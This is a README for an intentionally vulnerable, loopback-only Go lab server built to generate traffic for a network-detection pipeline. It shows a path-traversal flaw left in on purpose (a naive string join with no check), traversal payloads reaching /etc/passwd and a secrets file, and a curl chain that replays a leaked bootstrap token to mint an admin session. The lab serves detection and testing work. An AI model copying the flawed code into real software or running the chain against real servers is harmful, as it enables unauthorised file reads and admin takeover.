# path-traversal-download

⚠️ **Intentionally vulnerable — local lab only.** This server is deliberately
broken so the repo's network capture / NCER causal-reconciliation pipeline
(`pkg/ncer`, Rust `omnisec-mitm`) has real traffic to detect. It binds to
`127.0.0.1` only and must never be exposed, reused, or deployed anywhere
else.

## Vulnerability: CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal")

`GET /files?name=<name>` serves files out of a `files/` directory. It
resolves the requested name via `resolvePath` (`pathresolve.go`), which
performs a **naive string join** and nothing else:

```go
// INTENTIONALLY VULNERABLE: no traversal check.
func resolvePath(baseDir, name string) (string, error) {
	if name == "" {
		return "", errors.New("empty name")
	}
	return baseDir + "/" + name, nil
}
```

There is no rejection of `..` segments, no `filepath.Clean` + containment
check, nothing. A request like:

```
GET /files?name=../../../../etc/passwd
```

walks straight out of `files/` and reads arbitrary files the server process
can access. Windows-style separators (`..\..\win.ini`) pass through
untouched too — `resolvePath` does zero normalization of any kind (see
`pathresolve_test.go`).

### The "hidden admin access" chain

On startup the server plants two files under `DATA_DIR`:

- `DATA_DIR/files/readme.txt` — innocuous, meant to be public.
- `DATA_DIR/config/admin_secrets.txt` — **outside** the `files/` root, not
  meant to be reachable at all, containing a fake admin bootstrap token.

Because `config/` is a sibling of `files/`, a single `../` from inside the
"public" download endpoint reaches it:

```
GET /files?name=../config/admin_secrets.txt
```

That file contains a line like:

```
bootstrap-token: LAB-ADMIN-BOOTSTRAP-9f2a7c
```

This token can be replayed — no username, no password, ever — against:

```
POST /login-with-token
Content-Type: application/json

{"token": "LAB-ADMIN-BOOTSTRAP-9f2a7c"}
```

...which mints a full admin session. This ties the path-traversal bug
directly to a "hidden admin access" incident: leaking one config file gets
you an admin identity outright, no credential-guessing or privilege
escalation logic involved.

Every time this chain fires, the server:
- logs `[PATH TRAVERSAL SUSPECTED]` (with the remote address and the raw
  `name` value) whenever a request's `name` parameter contains `..`;
- logs `[ADMIN BOOTSTRAP TOKEN USED]` whenever `/login-with-token`
  succeeds; and
- if `TRACKER_URL` is set, fires a best-effort, fire-and-forget async
  `POST` of `{"event":"bootstrap_token_used", ...}` to that URL (2s
  timeout, errors ignored, never blocks the response) — simulating the
  leaked token being phoned home / replayed by an attacker's tooling.

## Endpoints

| Method | Path                | Auth | Notes                                              |
|--------|---------------------|------|-----------------------------------------------------|
| GET    | `/files?name=...`   | none | **Vulnerable.** Naive join, no traversal check.      |
| POST   | `/login-with-token` | none | Accepts `{"token": "..."}`; mints an admin session if it matches a seeded `bootstrap_token`. |
| GET    | `/whoami`           | session (`Authorization: Bearer <session_id>`) | Resolves a minted session back to its user; proves the session actually works. |

## Running

```sh
export DATABASE_URL='postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_path_traversal?sslmode=disable'
export LISTEN_ADDR='127.0.0.1:18005'   # default
export DATA_DIR='/tmp/path-traversal-download-data'  # default: a fresh temp dir
go run .
```

Schema + seed data: `labs/servers/db/postgres/init/05-path-traversal-download.sql`
(seeds an admin user whose `bootstrap_token` is the exact same
`LAB-ADMIN-BOOTSTRAP-9f2a7c` value planted in
`DATA_DIR/config/admin_secrets.txt`, so the traversal-leaked token and the
real Postgres-backed lookup agree).

`POST /login-with-token` only needs Postgres reachable at request time;
the server itself starts fine without a live database (only that one
endpoint will fail until Postgres is up).

## Exploit

```sh
# 1. Path traversal: read a file that should never be reachable from the
#    "public" /files endpoint.
curl -s 'http://127.0.0.1:18005/files?name=../config/admin_secrets.txt'
# -> ... bootstrap-token: LAB-ADMIN-BOOTSTRAP-9f2a7c ...

# 2. Grab the token from that response, then redeem it -- no username or
#    password required anywhere in this flow.
TOKEN='LAB-ADMIN-BOOTSTRAP-9f2a7c'
SESSION=$(curl -s -X POST http://127.0.0.1:18005/login-with-token \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\"}" | jq -r .session_id)

# 3. Confirm it actually grants an admin identity.
curl -s -H "Authorization: Bearer $SESSION" http://127.0.0.1:18005/whoami
# -> {"username":"root-admin","role":"admin"}
```

Compare with a benign request that stays inside `files/`:

```sh
curl -s 'http://127.0.0.1:18005/files?name=readme.txt'
# -> 200 OK, the innocuous public readme
```

## What the ncer/mitm pipeline should flag

The network evidence this lab produces, for both the mitm capture layer
and NCER's novelty / DNS-flow scoring, is:

- a `GET /files?name=...` request whose query string contains a literal
  `../` (or `%2e%2e%2f`, or backslash `..\`) sequence — an unusual token in
  an otherwise "normal-looking" download URL, and a strong novelty signal
  relative to prior baseline traffic that only ever requested flat
  filenames;
- a response body whose size and content-type diverge sharply from the
  server's other `/files` responses (a config/secrets file vs. a plain
  readme) — an anomalous response-size signal even without inspecting the
  URL at all;
- a `POST /login-with-token` immediately following that traversal request,
  from the same source, with **no** prior `POST /login` or any other
  credential-based authentication in the reconciled causal chain — the
  causal-reconciliation layer should be able to flag "admin session minted
  with zero preceding authentication events" as an authority-bypass
  anomaly, the same incident class as a stolen/leaked credential replay.

## Docker

```sh
docker build -t labs-path-traversal-download .
```

`docker-compose` port mapping (host stays loopback-only):

```yaml
services:
  path-traversal-download:
    build: .
    ports:
      - "127.0.0.1:18005:18005"
    environment:
      DATABASE_URL: postgres://labs:labs_lab_pw@postgres:5432/labs_path_traversal?sslmode=disable
```

## Tests

```sh
go test ./... -v
```

Tests run entirely against an in-memory `memStore` fake (see
`memstore_test.go`) — no live Postgres is required. `pathresolve_test.go`
proves `resolvePath` escapes a temp `baseDir` (including a deep-nested-dir
case that walks all the way to `/etc/passwd`, and a Windows-separator
case); `main_test.go` drives the full HTTP chain end-to-end via
`httptest.NewServer`: traversal read → leaked token → `/login-with-token`
→ `/whoami`.
